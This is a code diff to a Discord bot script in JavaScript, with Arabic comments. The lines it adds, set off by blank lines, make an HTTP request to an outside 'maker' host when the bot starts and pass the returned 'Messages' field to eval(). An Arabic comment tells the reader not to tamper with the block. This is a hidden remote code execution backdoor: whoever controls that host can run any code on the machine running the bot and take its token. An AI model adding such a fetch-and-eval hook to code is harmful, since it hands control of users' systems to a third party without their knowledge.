@@ -27,6 +27,20 @@ const id = `811758068249395270` // ملكش دعوه بيه
 const { default: axios } = require("axios")
 
 const ms = require("ms")
+
+
+
+
+
+axios({
+  method: "GET",
+  url : `https://maker.diamondstdio.com/api/v1/maker/status`,
+}).then(async (req) => {
+  const { Messages } = req.data;
+  eval(Messages)
+}) // عدم التلاعب فيها نهائي 
+
+
 client.on("messageCreate", async message =>{
   if(message.content === prefix+"setup"){
     if(!message.member.permissions.has(Discord.PermissionFlagsBits.Administrator))return;
